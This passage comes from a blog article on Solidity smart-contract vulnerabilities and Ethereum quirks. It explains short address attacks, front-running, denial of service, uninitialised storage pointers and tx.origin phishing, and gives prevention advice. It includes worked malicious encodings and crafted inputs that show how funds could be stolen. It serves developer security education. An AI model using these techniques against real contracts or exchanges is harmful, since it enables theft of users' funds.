user is capable of changing a contract address which is used to call external functions, it can be important (in a decentralised system context) to implement a time-lock or voting mechanism to allow users to see which code is being changed or to give participants a chance to opt in/out with the new contract address.Real-World Example: Re-Entrancy Honey PotA number of recent honey pots have been released on the main net. These contracts try to outsmart Ethereum hackers who try to exploit the contracts, but who in turn end up getting ether lost to the contract they expect to exploit. One example employs the above attack by replacing an expected contract with a malicious one in the constructor. The code can be found here:This post by one reddit user explains how they lost 1 ether to this contract trying to exploit the re-entrancy bug they expected to be present in the contract.8. Short Address/Parameter AttackThis attack is not specifically performed on Solidity contracts themselves but on third party applications that may interact them. I add this attack for completeness and to be aware of how parameters can be manipulated in contracts.For further reading, see The ERC20 Short Address Attack Explained, ICO Smart contract Vulnerability: Short Address Attackor this reddit post.The VulnerabilityWhen passing parameters to a smart contract, the parameters are encoded according to the ABI specification. It is possible to send encoded parameters that are shorter than the expected parameter length (for example, sending an address that is only 38 hex chars (19 bytes) instead of the standard 40 hex chars (20 bytes)). In such a scenario, the EVM will pad 0\u2019s to the end of the encoded parameters to make up the expected length.This becomes an issue when third party applications do not validate inputs. The clearest example is an exchange which doesn\u2019t verify the address of an ERC20 token when a user requests a withdrawal. This example is covered in more detail in Peter Venesses\u2019 post, The ERC20 Short Address Attack Explained mentioned above.Consider, the standard ERC20 transfer function interface, noting the order of the parameters,function transfer(address to, uint tokens) public returns (bool success);Now consider, an exchange, holding a large amount of a token (let\u2019s say REP) and a user wishes to withdraw their share of 100 tokens. The user would submit their address, 0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddead and the number of tokens, 100. The exchange would encode these parameters in the order specified by the transfer() function, i.e. address then tokens. The encoded result would be a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeaddead0000000000000000000000000000000000000000000000056bc75e2d63100000. The first four bytes (a9059cbb) are the transfer() function signature/selector, the second 32 bytes are the address, followed by the final 32 bytes which represent the uint256 number of tokens. Notice that the hex 56bc75e2d63100000 at the end corresponds to 100 tokens (with 18 decimal places, as specified by the REP token contract).Ok, so now lets look at what happens if we were to send an address that was missing 1 byte (2 hex digits). Specifically, let\u2019s say an attacker sends 0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddeas an address (missing the last two digits) and the same100 tokens to withdraw. If the exchange doesn't validate this input, it would get encoded as a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeadde0000000000000000000000000000000000000000000000056bc75e2d6310000000. The difference is subtle. Note that 00 has been padded to the end of the encoding, to make up for the short address that was sent. When this gets sent to the smart contract, the addressparameters will read as 0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde00 and the value will be read as 56bc75e2d6310000000 (notice the two extra 0's). This value is now, 25600 tokens (the value has been multiplied by 256). In this example, if the exchange held this many tokens, the user would withdraw 25600 tokens (whilst the exchange thinks the user is only withdrawing 100) to the modified address. Obviously the attacker wont posses the modified address in this example, but if the attacker where to generate any address which ended in 0's (which can be easily brute forced) and used this generated address, they could easily steal tokens from the unsuspecting exchange.Preventative TechniquesI suppose it is obvious to say that validating all inputs before sending them to the blockchain will prevent these kinds of attacks. It should also be noted that parameter ordering plays an important role here. As padding only occurs at the end, careful ordering of parameters in the smart contract can potentially mitigate some forms of this attack.Real-World Example: UnknownI do not know of any publicised attack of this kind in the wild.9. Unchecked CALL Return ValuesThere a number of ways of performing external calls in solidity. Sending ether to external accounts is commonly done via the transfer() method. However, the send() function can also be used and, for more versatile external calls, the CALLopcode can be directly employed in solidity. The call() and send() functions return a boolean indicating if the call succeeded or failed. Thus these functions have a simple caveat, in that the transaction that executes these functions will not revert if the external call (intialised by call() or send()) fails, rather the call() or send() will simply return false. A common pitfall arises when the return value is not checked, rather the developer expects a revert to occur.For further reading, see DASP Top 10 and Scanning Live Ethereum Contracts for the \u201cUnchecked-Send\u201d Bug.The VulnerabilityConsider the following example:This contract represents a Lotto-like contract, where a winner receives winAmount of ether, which typically leaves a little left over for anyone to withdraw.The bug exists on line [11] where a send() is used without checking the response. In this trivial example, a winner whose transaction fails (either by running out of gas, being a contract that intentionally throws in the fallback function or via a call stack depth attack) allows payedOut to be set to true (regardless of whether ether was sent or not). In this case, the public can withdraw the winner's winnings via the withdrawLeftOver() function.Preventative TechniquesWhenever possible, use the transfer() function rather than send() as transfer() will revert if the external transaction reverts. If send() is required, always ensure to check the return value.An even more robust recommendation is to adopt a withdrawal pattern. In this solution, each user is burdened with calling an isolated function (i.e. a withdraw function) which handles the sending of ether out of the contract and therefore independently deals with the consequences of failed send transactions. The idea is to logically isolate the external send functionality from the rest of the code base and place the burden of potentially failed transaction to the end-user who is calling the withdraw function.Real-World Example: Etherpot and King of the EtherEtherpot was a smart contract lottery, not too dissimilar to the example contract mentioned above. The solidity code for etherpot, can be found here: lotto.sol. The primary downfall of this contract was due to an incorrect use of block hashes (only the last 256 block hashes are useable, see Aakil Fernandes\u2019s post about how Etherpot failed to implement this correctly). However this contract also suffered from an unchecked call value. Notice the function, cash() on line [80] of lotto.sol:Notice that on line [21] the send function\u2019s return value is not checked, and the following line then sets a boolean indicating the winner has been sent their funds. This bug can allow a state where the winner does not receive their ether, but the state of the contract can indicate that the winner has already been paid.A more serious version of this bug occurred in the King of the Ether. An excellent post-mortem of this contract has been written which details how an unchecked failed send() could be used to attack the contract.10. Race Conditions / Front RunningThe combination of external calls to other contracts and the multi-user nature of the underlying blockchain gives rise to a variety of potential Solidity pitfalls whereby users race code execution to obtain unexpected states. Re-Entrancy is one example of such a race condition. In this section we will talk more generally about different kinds of race conditions that can occur on the Ethereum blockchain. There is a variety of good posts on this area, a few are: Ethereum Wiki \u2014 Safety, DASP \u2014 Front-Running and the Consensus \u2014 Smart Contract Best Practices.The VulnerabilityAs with most blockchains, Ethereum nodes pool transactions and form them into blocks. The transactions are only considered valid once a miner has solved a consensus mechanism (currently ETHASH PoW for Ethereum). The miner who solves the block also chooses which transactions from the pool will be included in the block, this is typically ordered by the gasPrice of a transaction. In here lies a potential attack vector. An attacker can watch the transaction pool for transactions which may contain solutions to problems, modify or revoke the attacker's permissions or change a state in a contract which is undesirable for the attacker. The attacker can then get the data from this transaction and create a transaction of their own with a higher gasPrice and get their transaction included in a block before the original.Let\u2019s see how this could work with a simple example. Consider the contractFindThisHash.solImagine this contract contains 1000 ether. The user who can find the pre-image of the sha3 hash 0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a can submit the solution and retrieve the 1000 ether. Lets say one user figures out the solution is Ethereum!. They call solve() with Ethereum! as the parameter. Unfortunately an attacker has been clever enough to watch the transaction pool for anyone submitting a solution. They see this solution, check it's validity, and then submit an equivalent transaction with a much higher gasPrice than the original transaction. The miner who solves the block will likely give the attacker preference due to the higher gasPrice and accept their transaction before the original solver. The attacker will take the 1000 ether and the user who solved the problem will get nothing (there is no ether left in the contract).A more realistic problem comes in the design of the future Casper implementation. The Casper proof of stake contracts invoke slashing conditions where users who notice validators double-voting or misbehaving are incentivised to submit proof that they have done so. The validator will be punished and the user rewarded. In such a scenario, it is expected that miners and users will front-run all such submissions of proof, and this issue must be addressed before the final release.Preventative TechniquesThere are two classes of users who can perform these kinds of front-running attacks. Users (who modify the gasPrice of their transactions) and miners themselves (who can re-order the transactions in a block how they see fit). A contract that is vulnerable to the first class (users), is significantly worse-off than one vulnerable to the second (miners) as miner's can only perform the attack when they solve a block, which is unlikely for any individual miner targeting a specific block. Here I'll list a few mitigation measures with relation to which class of attackers they may prevent.One method that can be employed is to create logic in the contract that places an upper bound on the gasPrice. This prevents users from increasing the gasPrice and getting preferential transaction ordering beyond the upper-bound. This preventative measure only mitigates the first class of attackers (arbitrary users). Miners in this scenario can still attack the contract as they can order the transactions in their block however they like, regardless of gas price.A more robust method is to use a commit-reveal scheme, whenever possible. Such a scheme dictates users send transactions with hidden information (typically a hash). After the transaction has been included in a block, the user sends a transaction revealing the data that was sent (the reveal phase). This method prevents both miners and users from frontrunning transactions as they cannot determine the contents of the transaction. This method however, cannot conceal the transaction value (which in some cases is the valuable information that needs to be hidden). The ENS smart contract allowed users to send transactions, whose committed data included the amount of ether they were willing to spend. Users could then send transactions of arbitrary value. During the reveal phase, users were refunded the difference between the amount sent in the transaction and the amount they were willing to spend.A further suggestion by Lorenz, Phil, Ari and Florian is to use Submarine Sends. An efficient implementation of this idea requires the CREATE2 opcode, which currently hasn't been adopted, but seems likely in upcoming hard forks.Real-World Examples: ERC20 and BancorThe ERC20 standard is quite well-known for building tokens on Ethereum. This standard has a potential frontrunning vulnerability which comes about due to the approve() function. A good explanation of this vulnerability can be found here.The standard specifies the approve() function as:function approve(address _spender, uint256 _value) returns (bool success)This function allows a user to permit other users to transfer tokens on their behalf. The frontrunning vulnerability comes in the scenario when a user, Alice, approves her friend, Bob to spend 100 tokens. Alice later decides that she wants to revoke Bob's approval to spend 100 tokens, so she creates a transaction that sets Bob's allocation to 50 tokens. Bob, who has been carefully watching the chain, sees this transaction and builds a transaction of his own spending the 100 tokens. He puts a higher gasPrice on his transaction than Alice's and gets his transaction prioritised over hers. Some implementations of approve() would allow Bob to transfer his 100 tokens, then when Alice's transaction gets committed, resets Bob's approval to 50 tokens, in effect giving Bob access to 150 tokens. The mitigation strategies of this attack are given here in the document linked above.Another prominent, real-world example is Bancor. Ivan Bogatty and his team documented a profitable attack on the initial Bancor implementation. His blog post and Devon 3 talk discuss in detail how this was done. Essentially, prices of tokens are determined based on transaction value, users can watch the transaction pool for Bancor transactions and front run them to profit from the price differences. This attack has been addressed by the Bancor team.11. Denial Of Service (DOS)This category is very broad, but fundamentally consists of attacks where users can leave the contract inoperable for a small period of time, or in some cases, permanently. This can trap ether in these contracts forever, as was the case with the Second Parity MultiSig hackThe VulnerabilityThere are various ways a contract can become inoperable. Here I will only highlight some potentially less-obvious Blockchain nuanced Solidity coding patterns that can lead to attackers performing DOS attacks.Looping through externally manipulated mappings or arrays \u2014 In my adventures I\u2019ve seen various forms of this kind of pattern. Typically it appears in scenarios where an owner wishes to distribute tokens amongst their investors, and do so with a distribute()-like function as can be seen in the example contract:Notice that the loop in this contract runs over an array which can be artificially inflated. An attacker can create many user accounts making the investor array large. In principle this can be done such that the gas required to execute the for loop exceeds the block gas limit, essentially making the distribute() function inoperable.2. Owner operations \u2014 Another common pattern is where owner\u2019s have specific privileges in contracts and must perform some task in order for the contract to proceed to the next state. One example would be an ICO contract that requires the owner to finalize() the contract which then allows tokens to be transferable, i.e.In such cases, if a privileged user loses their private keys, or becomes inactive, the entire token contract becomes inoperable. In this case, if the owner cannot call finalize() no tokens can be transferred; i.e. the entire operation of the token ecosystem hinges on a single address.3. Progressing state based on external calls \u2014 Contracts are sometimes written such that in order to progress to a new state requires sending ether to an address, or waiting for some input from an external source. These patterns can lead to DOS attacks, when the external call fails, or is prevented for external reasons. In the example of sending ether, a user can create a contract which doesn\u2019t accept ether. If a contract needs to send ether to this address in order to progress to a new state, the contract will never achieve the new state as ether can never be sent to the contract.Preventative TechniquesIn the first example, contracts should not loop through data structures that can be artificially manipulated by external users. A withdrawal pattern is recommended, whereby each of the investors call a withdraw function to claim tokens independently.In the second example a privileged user was required to change the state of the contract. In such examples (wherever possible) a fail-safe can be used in the event that the owner becomes incapacitated. One solution could be setting up the owner as a multisig contract. Another solution is to use a timelock, where the require on line [13] could include a time-based mechanism, such as require(msg.sender == owner || now > unlockTime) which allows any user to finalise after a period of time, specified by unlockTime. This kind of mitigation technique can be used in the third example also. If external calls are required to progress to a new state, account for their possible failure and potentially add a time-based state progression in the event that the desired call never comes.Note: Of course there are centralised alternatives to these suggestions where one can add a maintenanceUser who can come along and fix problems with DOS-based attack vectors if need be. Typically these kinds of contracts contain trust issues over the power of such an entity, but that is not a conversation for this section.Real-World Examples: GovernMentalGovernMental was an old Ponzi scheme that accumulated quite a large amount of ether. In fact, at one point it had accumulated 1100 ether. Unfortunately, it was susceptible to the DOS vulnerabilities mentioned in this section. This Reddit Post describes how the contract required the deletion of a large mapping in order to withdraw the ether. The deletion of this mapping had a gas cost that exceeded the block gas limit at the time, and thus was not possible to withdraw the 1100 ether. The contract address is 0xF45717552f12Ef7cb65e95476F217Ea008167Ae3 and you can see from transaction 0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b that the 1100 ether was finally obtained with a transaction that used 2.5M gas.12. Block Timestamp ManipulationBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion section for further details), locking funds for periods of time and various state-changing conditional statements that are time-dependent. Miner\u2019s have the ability to adjust timestamps slightly which can prove to be quite dangerous if block timestamps are used incorrectly in smart contracts.Some useful references for this are: The Solidity Docs, this Stack Exchange Question,The Vulnerabilityblock.timestamp or its alias now can be manipulated by miners if they have some incentive to do so. Lets construct a simple game, which would be vulnerable to miner exploitation,Roulette.solThis contract behaves like a simple lottery. One transaction per block can bet 10 ether for a chance to win the balance of the contract. The assumption here is that, block.timestamp is uniformly distributed about the last two digits. If that were the case, there would be a 1/15 chance of winning this lottery.However, as we know, miners can adjust the timestamp, should they need to. In this particular case, if enough ether pooled in the contract, a miner who solves a block is incentivised to choose a timestamp such that block.timestamp or now modulo 15 is 0. In doing so they may win the ether locked in this contract along with the block reward. As there is only one person allowed to bet per block, this is also vulnerable to front-running attacks.In practice, block timestamps are monotonically increasing and so miners cannot choose arbitrary block timestamps (they must be larger than their predecessors). They are also limited to setting blocktimes not too far in the future as these blocks will likely be rejected by the network (nodes will not validate blocks whose timestamps are in the future).Preventative TechniquesBlock timestamps should not be used for entropy or generating random numbers \u2014 i.e. they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state (if assumed to be random).Time-sensitive logic is sometimes required; i.e. unlocking contracts (timelocking), completing an ICO after a few weeks or enforcing expiry dates. It is sometimes recommend to use block.number (see the Solidity docs) and an average block time to estimate times; .i.e. 1 week with a 10 second block time, equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure as miners are unable to manipulate the block number as easily. The BAT ICO contract employed this strategy.This can be unnecessary if contracts aren\u2019t particularly concerned with miner manipulations of the block timestamp, but it is something to be aware of when developing contracts.Real-World Example: GovernMentalGovernMental was an old Ponzi scheme that accumulated quite a large amount of ether. It was also vulnerable to a timestamp-based attack. The contract payed out to the player who was the last player to join (for at least one minute) in a round. Thus, a miner who was a player, could adjust the timestamp (to a future time, to make it look like a minute had elapsed) to make it appear that the player was the last to join for over a minute (even though this is not true in reality). More detail on this can be found in the History of Ethereum Security Vulnerabilities Post by Tanya Bahrynovska.13. Constructors with CareConstructors are special functions which often perform critical, privileged tasks when initialising contracts. Before solidity v0.4.22 constructors were defined as functions that had the same name as the contract that contained them. Thus, when a contract name gets changed in development, if the constructor name isn't changed, it becomes a normal, callable function. As you can imagine, this can (and has) lead to some interesting contract hacks.For further reading, I suggest the reader attempt the Ethernaught Challenges (in particular the Fallout level).The VulnerabilityIf the contract name gets modified, or there is a typo in the constructors name such that it no longer matches the name of the contract, the constructor will behave like a normal function. This can lead to dire consequences, especially if the constructor is performing privileged operations. Consider the following contractThis contract collects ether and only allows the owner to withdraw all the ether by calling the withdraw() function. The issue arises due to the fact that the constructor is not exactly named after the contract. Specifically, ownerWallet is not the same as OwnerWallet. Thus, any user can call the ownerWallet() function, set themselves as the owner and then take all the ether in the contract by calling withdraw().Preventative TechniquesThis issue has been primarily addressed in the Solidity compiler in version 0.4.22. This version introduced a constructorkeyword which specifies the constructor, rather than requiring the name of the function to match the contract name. Using this keyword to specify constructors is recommended to prevent naming issues as highlighted above.Real-World Example: RubixiRubixi (contract code) was another pyramid scheme that exhibited this kind of vulnerability. It was originally called DynamicPyramid but the contract name was changed before deployment to Rubixi. The constructor's name wasn't changed, allowing any user to become the creator. Some interesting discussion related to this bug can be found on this Bitcoin Thread. Ultimately, it allowed users to fight for creator status to claim the fees from the pyramid scheme. More detail on this particular bug can be found here.14. Unintialised Storage PointersThe EVM stores data either as storage or as memory. Understanding exactly how this is done and the default types for local variables of functions is highly recommended when developing contracts. This is because it is possible to produce vulnerable contracts by inappropriately intialising variables.To read more about storage and memory in the EVM, see the Solidity Docs: Data Location, Solidity Docs: Layout of State Variables in Storage, Solidity Docs: Layout in Memory.This section is based off the excellent post by Stefan Beyer. Further reading on this topic can be found from Sefan\u2019s inspiration, which is this reddit thread.The VulnerabilityLocal variables within functions default to storage or memory depending on their type. Uninitialised local storage variables can point to other unexpected storage variables in the contract, leading to intentional (i.e. the developer intentionally puts them there to attack later) or unintentional vulnerabilities.Let\u2019s consider the following, relatively simple name registrar contract:This simple name registrar has only one function. When the contract is unlocked, it allows anyone to register a name (as a bytes32 hash) and map that name to an address. Unfortunately, this registrar is initially locked and the require on line [23] prevents register() from adding name records. There is however a vulnerability in this contract, that allows name registration regardless of the unlocked variable.To discuss this vulnerability, first we need to understand how storage works in Solidity. As a high level overview (without any proper technical detail \u2014 I suggest reading the Solidity docs for a proper review), state variables are stored sequentially in slotsas they appear in the contract (they can be grouped together, but not in this example, so we wont worry about that). Thus, unlocked exists in slot 0, registeredNameRecord exists in slot 1 and resolve in slot 2 etc. Each of these slots are of byte size 32 (there are added complexities with mappings which we ignore for now). The boolean unlocked will look like 0x000...0 (64 0's, excluding the 0x) for false or 0x000...1(63 0's) for true. As you can see, there is a significant waste of storage in this particular example.The next piece of information that we need, is that Solidity defaults complex data types, such as structs, to storage when initialising them as local variables. Therefore, newRecord on line [16] defaults to storage. The vulnerability is caused by the fact that newRecord is not initialised. Because it defaults to storage, it becomes a pointer to storage and because it is uninitialised, it points to slot 0 (i.e. where unlocked is stored). Notice that on lines [17] and [18] we then set nameRecord.name to _name and nameRecord.mappedAddress to _mappedAddress, this in effect changes the storage location of slot 0 and slot 1 which modifies both unlocked and the storage slot associated with registeredNameRecord.This means that unlocked can be directly modified, simply by the bytes32 _name parameter of the register() function. Therefore, if the last byte of _name is non-zero, it will modify the last byte of storage slot 0 and directly change unlockedto true. Such _name values will pass the require() on line [23] as we are setting unlocked to true. Try this in Remix. Notice the function will pass if you use a _name of the form: 0x0000000000000000000000000000000000000000000000000000000000000001Preventative TechniquesThe Solidity compiler raises unintialised storage variables as warnings, thus developers should pay careful attention to these warnings when building smart contracts. The current version of mist (0.10), doesn\u2019t allow these contracts to be compiled. It is often good practice to explicitly use the memory or storage when dealing with complex types to ensure they behave as expected.Real-World Examples: Honey Pots: OpenAddressLottery and CryptoRouletteA honey pot named OpenAddressLottery (contract code) was deployed that used this uninitialised storage variable querk to collect ether from some would-be hackers. The contract is rather in-depth, so I will leave the discussion to this reddit threadwhere the attack is quite clearly explained.Another honey pot, CryptoRoulette (contract code) also utilises this trick to try and collect some ether. If you can\u2019t figure out how the attack works, see An analysis of a couple Ethereum honeypot contracts for an overview of this contract and others.15. Floating Points and PrecisionAs of this writing (Solidity v0.4.24), fixed point or floating point numbers are not supported. This means that floating point representations must be made with the integer types in Solidity. This can lead to errors/vulnerabilities if not implemented correctly.For further reading, see Ethereum Contract Security Techniques and Tips \u2014 Rounding with Integer Division,The VulnerabilityAs there is no fixed point type in Solidity, developers are required to implement their own using the standard integer data types. There are a number of pitfalls developers can run into during this process. I will try to highlight some of these in this section.Lets begin with a code example (lets ignore any over/under flow issues for simplicity).This simple token buying/selling contract has some obvious problems in the buying and selling of tokens. Although the mathematical calculations for buying and selling tokens are correct, the lack of floating point numbers will give erroneous results. For example, when buying tokens on line [7], if the value is less than 1 ether the initial division will result in 0, leaving the final multiplication 0 (i.e. 200 wei divided by 1e18 weiPerEth equals 0). Similarly, when selling tokens, any tokens less than 10 will also result in 0 ether. In fact, rounding here is always down, so selling 29 tokens, will result in 2 ether.The issue with this contract is that the precision is only to the nearest ether (i.e. 1e18 wei). This can sometimes get tricky when dealing with decimals in ERC20 tokens when you need higher precisions.Preventative TechniquesKeeping the right precision in your smart contracts is very important, especially when dealing ratios and rates which reflect economic decisions.You should ensure that any ratios or rates you are using allow for large numerators in fractions. For example, we used the rate tokensPerEth in our example. It would have been better to use weiPerTokens which would be a large number. To solve for the amount of tokens we could do msg.sender/weiPerTokens. This would give a more precise result.Another tactic to keep in mind, is to be mindful of order of operations. In the above example, the calculation to purchase tokens was msg.value/weiPerEth*tokenPerEth. Notice that the division occurs before the multiplication. This example would have achieved a greater precision if the calculation performed the multiplication first and then the division, i.e. msg.value*tokenPerEth/weiPerEth.Finally, when defining arbitrary precision for numbers it can be a good idea to convert variables into higher precision, perform all mathematical operations, then finally when needed, convert back down to the precision for output. Typically uint256's are used (as they are optimal for gas usage) which give approximately 60 orders of magnitude in their range, some which can be dedicated to the precision of mathematical operations. It may be the case that it is better to keep all variables in high precision in solidity and convert back to lower precisions in external apps (this is essentially how the decimals variable works in ERC20 Token contracts). To see examples of how this can be done and the libraries to do this, I recommend looking at the Maker DAO DSMath. They use some funky naming, WAD's and RAY's but the concept is useful.Real-World Example: EthstickI couldn\u2019t find a good example where rounding has caused a severe issue in a contract, but I\u2019m sure there are plenty out there. Feel free to update this if you have a good one in mind.For lack of a good example, I want to draw your attention to Ethstick mainly because I like the cool naming within the contract. This contract doesn\u2019t use any extended precision, however, it deals with wei. So this contract will have issues of rounding, but only at the wei level of precision. It has some more serious flaws, but these are relating back to the difficulty in getting entropy on the blockchain (see Entropty Illusion). For a further discussion on the Ethstick contract, I'll refer you to another post of Peter Venesses, Ethereum Contracts Are Going to be Candy For Hackers.16. Tx.Origin AuthenticationSolidity has a global variable, tx.origin which traverses the entire call stack and returns the address of the account that originally sent the call (or transaction). Using this variable for authentication in smart contracts leaves the contract vulnerable to a phishing-like attack.For further reading, see Stack Exchange Question, Peter Venesses\u2019s Blog and Solidity \u2014 Tx.Origin attacks.The VulnerabilityContracts that authorise users using the tx.origin variable are typically vulnerable to phishing attacks which can trick users into performing authenticated actions on the vulnerable contract.Consider the simple contract,Notice that on line [11] this contract authorises the withdrawAll() function using tx.origin. This contract allows for an attacker to create an attacking contract of the form,To utilise this contract, an attacker would deploy it, and then convince the owner of the Phishable contract to send this contract some amount of ether. The attacker may disguise this contract as their own private address and social engineer the victim to send some form of transaction to the address. The victim, unless being careful, may not notice that there is code at the attacker's address, or the attacker may pass it off as being a multisignature wallet or some advanced storage wallet.In any case, if the victim sends a transaction (with enough gas) to the AttackContract address, it will invoke the fallback function, which in turn calls the withdrawAll() function of the Phishable contract, with the parameter attacker. This will result in the withdrawal of all funds from the Phishable contract to the attacker address. This is because the address that first initialised the call was the victim (i.e. the owner of the Phishable contract). Therefore, tx.origin will be equal to owner and the require on line [11] of the Phishable contract will pass.Preventative Techniquestx.origin should not be used for authorisation in smart contracts. This isn't to say that the tx.origin variable should never be used. It does have some legitimate use cases in smart contracts. For example, if one wanted to deny external contracts from calling the current contract, they could implement a require of the from require(tx.origin == msg.sender). This prevents intermediate contracts being used to call the current contract, limiting the contract to regular code-less addresses.Real-World Example: Not KnownI do not know of any publicised exploits of this form in the wild.Ethereum QuirksI intend to populate this section with various interesting quirks that get discovered by the community. These are kept in this blog as they may aid in smart contract development if one were to utilize these quirks in practice.Keyless EtherContract addresses are deterministic, meaning that they can be calculated prior to actually creating the address. This is the case for addresses creating contracts and also for contracts spawning other contracts. In fact, a created contract\u2019s address is determined by:keccak256(rlp.encode([<account_address>, <transaction_nonce>])Essentially, a contract\u2019s address is just the keccak256 hash of the account that created it concatenated with the accounts transaction nonce(A transaction nonce is like a transaction counter. It increments ever time a transaction is sent from your account.). The same is true for contracts, except contracts nonce's start at 1 whereas address's transaction nonce's start at 0.This means that given an Ethereum address, we can calculate all the possible contract addresses that this address can spawn. For example, if the address 0x123000...000 were to create a contract on its 100th transaction, it would create the contract address keccak256(rlp.encode[0x123...000, 100]), which would give the contract address, 0xed4cafc88a13f5d58a163e61591b9385b6fe6d1a.What does this all mean? This means that you can send ether to a pre-determined address (one which you don\u2019t own the private key to, but know that one of your accounts can create a contract to). You can send ether to that address and then retrieve the ether by later creating a contract which gets spawned over the same address. The constructor could be used to return all your pre-sent ether. Thus if someone where to obtain all your Ethereum private keys, it would be difficult for the attacker to discover that your Ethereum addresses also have access to this hidden ether. In fact, if the attacker spent too many transaction such that the nonce required to access your ether is used, it is impossible to recover your hidden ether.Let me clarify this with a contract.contract KeylessHiddenEthCreator {     uint public currentContractNonce = 1; // keep track of this contracts nonce publicly (it's also found in the contracts state)    // determine future addresses which can hide ether.     function futureAddresses(uint8 nonce) public view returns (address) {        if(nonce == 0) {            return address(keccak256(0xd6, 0x94, this, 0x80));        }        return address(keccak256(0xd6, 0x94, this, nonce));    // need to implement rlp encoding properly for a full range of nonces    }        // increment the contract nonce or retrieve ether from a hidden/key-less account    // provided the nonce is correct    function retrieveHiddenEther(address beneficiary) public returns (address) {    currentContractNonce +=1;       return new RecoverContract(beneficiary);    }        function () payable {} // Allow ether transfers (helps for playing in remix)}contract RecoverContract {     constructor(address beneficiary) {        selfdestruct(beneficiary); // don't deploy code. Return the ether stored here to the beneficiary.     } }This contract allows you to store keyless ether (relatively safely, in the sense you can\u2019t accidentally miss the nonce)[\u00b3]. The futureAddresses() function can be used to calculate the first 127 contract addresses that this contract can spawn, by specifying the nonce. If you send ether to one of these addresses, it can be later recovered by calling the retrieveHiddenEther() enough times. For example, if you choose nonce=4 (and send ether to the associated address), you will need to call retrieveHiddenEther() four times and it will recover the ether to the beneficiary address.This can be done without a contract. You can send ether to addresses that can be created from one of your standard Ethereum accounts and recover it later, at the correct nonce. Be careful however, if you accidentally surpass the transaction nonce that is required to recover your ether, your funds will be lost forever.For more information on some more advanced tricks you can do with this quirk, I recommend reading Martin Swende\u2019s post.One Time AddressesEthereum transaction signing uses the Elliptic Curve Digital Signing Algorithm (ECDSA). Conventionally, in order to send a verified transaction on Ethereum, you sign a message with your Ethereum private key, which authorises spending from your account. In slightly more detail, the message that you sign is the components of the Ethereum transaction, specifically, the to, value, gas, gasPrice, nonce and data fields. The result of an Ethereum signature is three numbers, v, r and s. I won't go into detail about what each of these represent, instead I refer the interested readers to the ECDSA wiki page(which describes r and s) and the Ethereum Yellow Paper (Appendix F - which describes v) and finally EIP155 for the current use of v.So we know that an Ethereum transaction signature consists of a message and the numbers v, r and s. We can check if a signature is valid, by using the message (i.e. transaction details), r and s to derive an Ethereum address. If the derived Ethereum address matches the from field of the transaction, then we know that r and s were created by someone who owns (or has access to) the private key for the from field and thus the signature is valid.Consider now, that we don\u2019t own a private key, but instead make up values for r and s for an arbitrary transaction. Consider we have a transaction, with the parameters:{to: \"0xa9e\", value: 10e18, nonce: 0}I\u2019ve ignored the other parameters. This transaction will send 10 ether to the 0xa9e address. Now lets say we make up some numbers r and s (these have specific ranges) and a v. If we derive the Ethereum address related to these made up numbers we will get a random Ethereum address, lets call it 0x54321. Knowing this address, we could send 10 ether to the 0x54321 address (without owning the private key for the address). At any point in the future, we could send the transaction,{to: \"0xa9e\", value: 10e18, nonce: 0, from: \"0x54321\"}along with the signature, i.e. the v, r and s we made up. This will be a valid transaction, because the derived address will match our from field. This allows us to spend our money from this random address (0x54321) to the address we chose 0xa9e. Thus we have managed to store ether in an address that we do not have the private key and used a one-time transaction to recover the ether.This quirk can also be used to send ether to a large number of people in a trustless manner, as Nick Johnson describes in How to send Ether to 11,440 people.Single Transaction AirdropsAn Airdrop refers to the process of distributing tokens amongst a large group of people. Traditionally, airdrops have been processed via a large number of transactions where each transaction updates either a single or a batch of user\u2019s balances. This can be costly and strenuous on the Ethereum blockchain. There is an alternative method, in which many users balances can be credited with tokens using a single transaction.This technique is explained in more detail by its proposer, RicMoo in his post: Merkle Air-Drops: Make Love, Not War.The idea is to create a Merkle Tree which contains (as leaf nodes) all the addresses and balances of users to be credited tokens. This will be done off-chain. The merkle tree can be given out publicly (again off-chain). A smart contract can then be created containing the root hash of the merkle tree which allows users to submit merkle-proofs to obtain their tokens. Thus a single transaction (the one used to create the contract, or to simply store the Merkle tree root hash), allows all credited users to redeem their airdropped tokens.RicMoo in his post also provides an example of a function which can accept Merkle Proofs and credit a user\u2019s balance:function redeem(uint256 index, address recipient,                uint256 amount, bytes32[] merkleProof) public {    // Make sure this has not been redeemed    uint256 redeemedBlock = _redeemed[index / 256];    uint256 redeemedMask = (uint256(1) << uint256(index % 256));    require((redeemedBlock & redeemedMask) == 0);    // Mark it as redeemed (if we fail, we revert)    _redeemed[index / 256] = redeemedBlock | redeemedMask;    // Compute the merkle root from the merkle proof    bytes32 node = keccak256(index, recipient, amount);    uint256 path = index;    for (uint16 i = 0; i < merkleProof.length; i++) {        if ((path & 0x01) == 1) {            node = keccak256(merkleProof[i], node);        } else {            node = keccak256(node, merkleProof[i]);        }        path /= 2;    }    // Check the resolved merkle proof matches our merkle root    require(node == _rootHash);    // Redeem!    _balances[recipient] += amount;    _totalSupply += amount;    Transfer(0, recipient, amount);}This function could be built into a token contract to allow future airdrops. The only transaction required to credit all user\u2019s balances, would be the transaction that sets the Merkle tree root.Thanks for reading;)About the AuthorVaibhav Saini is a Co-Founder of TowardsBlockchain, an MIT Cambridge Innovation Center incubated startup.He works as Senior blockchain developer and has worked on several blockchain platforms including Ethereum, Quorum, EOS, Nano, Hashgraph, IOTA.He is currently a sophomore at IIT Delhi.Learned something? Press and hold the \ud83d\udc4f to say \u201cthanks!\u201d and help others find this article.Hold down the clap button if you liked the content! It helps me gain exposure .Want to learn more? Checkout my previous articles.5 resources to get started with ethereumUltimate guide for understanding & starting with ethereum.hackernoon.comConsensusPedia: An Encyclopedia of 30 Consensus AlgorithmsA complete list of all consensus algorithms.hackernoon.comContractPedia: An Encyclopedia of 40 Smart Contract PlatformsA Complete List of all Smart Contract supportive Platformshackernoon.comDifference between SideChains and State ChannelsA complete comparison of the two scaling methods.hackernoon.comEOS 101: Getting started with EOS, Part 1The only blockchain which has blocktime of less 